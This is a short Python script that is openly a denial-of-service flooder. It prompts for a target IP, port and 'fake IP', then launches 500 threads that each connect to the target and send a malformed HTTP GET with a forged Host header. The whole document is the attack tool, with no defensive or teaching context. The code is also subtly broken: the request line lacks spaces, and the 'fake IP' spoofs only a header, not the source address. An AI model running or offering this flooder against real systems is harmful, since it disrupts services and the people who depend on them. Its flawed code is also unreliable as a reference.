import threading
import socket

target=input('Enter the Target IP: ')
port=int(input('Enter the Target Port: '))
fake_ip=input('Enter a Fake IP: ')

def attack():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,port))
    s.sendto(('GET/'+target+'HTTP/1.1\r\n').encode('ascii'), (target,port))
    s.sendto(('HOST: ' + fake_ip + '\r\n\r\n').encode('ascii'), (target, port))

for i in range(500):
    thread=threading.Thread(target=attack)
    thread.start()